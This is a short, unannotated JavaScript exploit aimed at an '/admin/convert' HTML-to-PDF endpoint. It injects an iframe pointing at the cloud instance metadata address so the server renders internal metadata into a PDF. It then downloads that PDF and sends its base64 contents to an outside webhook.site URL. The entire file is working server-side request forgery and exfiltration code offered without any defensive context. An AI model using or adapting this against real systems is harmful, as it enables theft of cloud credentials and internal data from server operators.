const htmlCode = "<body><iframe src='http://169.254.169.254/latest/meta-data/'></iframe></body>";
const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/convert");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.timeout = 3000; // Set a timeout of 3 seconds
xhr.onload = function() {
  if (xhr.status === 200) {
    const response = JSON.parse(xhr.responseText);
    const pdfLink = response.pdfLink;
    const encpdflink = encodeURIComponent(pdfLink);

    const pdfRequest = new XMLHttpRequest();
    pdfRequest.open("GET", pdfLink);
    pdfRequest.responseType = "blob";
    pdfRequest.timeout = 3000; // Set a timeout of 3 seconds
    pdfRequest.onload = async function() {
      if (pdfRequest.status === 200) {
        const blob = pdfRequest.response;
        const pdfContent = await new Promise((resolve) => {
          const reader = new FileReader();
          reader.onload = () => resolve(reader.result);
          reader.readAsDataURL(blob);
        });

        const webhookUrl = `https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?data=${encodeURIComponent(pdfContent)}`;
        const webhookRequest = new XMLHttpRequest();
        webhookRequest.open("GET", webhookUrl);
        webhookRequest.timeout = 3000; // Set a timeout of 3 seconds
        webhookRequest.send();
      }
    };
    pdfRequest.onerror = function() {
      console.log("Error reading PDF file.");
    };
    pdfRequest.send();
  }
};
xhr.onerror = function() {
  console.log("Error sending request.");
};
xhr.send(JSON.stringify({ htmlCode: htmlCode }));
